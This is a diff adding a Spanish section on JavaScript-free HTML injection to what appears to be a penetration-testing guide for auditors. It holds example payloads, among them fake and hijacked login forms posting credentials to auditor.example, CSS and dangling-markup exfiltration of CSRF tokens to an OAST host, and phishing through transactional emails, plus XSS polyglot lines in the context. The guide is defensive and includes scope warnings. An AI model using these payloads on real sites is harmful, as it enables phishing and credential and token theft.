@@ -250,6 +250,34 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</
 '"--></style></script><svg onload=alert(document.domain)>
 ```
 
+
+### 4.14 Inyección HTML sin JavaScript
+
+Cuando la entrada se refleja como HTML pero un saneador o la CSP bloquean `<script>` y los manejadores de eventos, a menudo siguen permitidas etiquetas «inofensivas»: `<a>`, `<form>`, `<img>`, `<meta>`, `<base>`, `<style>`, `<table>`… Eso ya da para ataques creíbles **desde el dominio legítimo**, que es lo que los hace peligrosos.
+
+Primero confirma que el HTML se interpreta, con un marcador visible e inocuo:
+
+```html
+<h1>CORVUS-HTML</h1><u>subrayado</u><a href="https://example.com/?corvus=html">enlace</a>
+```
+
+| Técnica | Payload de ejemplo | Impacto |
+|---|---|---|
+| Suplantación de contenido | `<div style="position:fixed;inset:0;background:#fff"><h2>Sesión caducada</h2>…</div>` | Mensajes falsos con la apariencia de la web |
+| Formulario falso | `<form action="https://auditor.example/corvus"><input name="u"><input type="password" name="p"><button>Entrar</button></form>` | *Phishing* desde el origen de confianza |
+| Secuestro de formularios existentes | `<button form="login" formaction="https://auditor.example/corvus">Entrar</button>` | Las credenciales del formulario real se envían fuera |
+| Redirección | `<meta http-equiv="refresh" content="0;url=https://example.com/?corvus=meta">` | *Open redirect* sin JavaScript |
+| `<base>` | `<base href="https://auditor.example/">` | Los scripts e imágenes con ruta **relativa** se cargan del dominio del auditor; si hay scripts relativos sin `base-uri` en la CSP, pasa a ser XSS |
+| Exfiltración con CSS | `<style>input[name=csrf][value^=a]{background:url(https://OAST/a)}</style>` | Lectura de tokens carácter a carácter (ver §4.6) |
+| Marcado colgante | `<img src='https://OAST/?` (sin cerrar) | Se lleva el HTML siguiente, con tokens incluidos (ver §5.1) |
+| Baliza | `<img src="https://OAST/corvus-html">` | Confirma que el HTML se pinta en sitios que no ves: correos, PDF, paneles internos |
+
+**Correos transaccionales:** un vector muy rentable es meter HTML en campos que luego aparecen en correos que envía la aplicación (nombre, empresa, nota de una invitación o de un pedido). El correo sale del remitente legítimo, con SPF y DKIM válidos, y el enlace o formulario inyectado parece auténtico. Pruébalo **solo hacia buzones de tus cuentas de prueba**.
+
+⚠️ Las inyecciones almacenadas que verían usuarios reales, y cualquier formulario que pida credenciales, requieren confirmación explícita del cliente. Para la PoC basta con el marcador visible, una captura del formulario renderizado (con `action` hacia un dominio del auditor que no guarde nada) y la baliza OAST.
+
+Severidad orientativa: suplantación de contenido o formulario falso con interacción, `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N` (4.3). Con lectura de tokens por CSS o marcado colgante, súbela según el dato obtenido.
+
 ## 5. Evasión de filtros y WAF
 
 **Etiquetas y atributos poco comunes**
